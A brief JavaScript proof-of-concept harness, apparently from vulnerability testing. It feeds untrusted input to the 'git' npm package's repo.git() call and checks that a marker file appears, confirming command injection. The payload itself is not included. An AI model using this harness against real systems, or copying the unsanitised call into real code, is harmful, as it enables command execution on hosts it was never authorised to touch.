function exploitFunction(user_input) {
  const Git = require("git").Git;
  const fs = require("fs");
  const path = "./git";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }

  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    const repo = new Git("repo-test");
    repo.git(user_input, function (err, result) {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        if (err) {
          console.error(err);
        }
      });
    });
  } catch (error) {
    console.error(error);
  }
}

module.exports = { exploitFunction };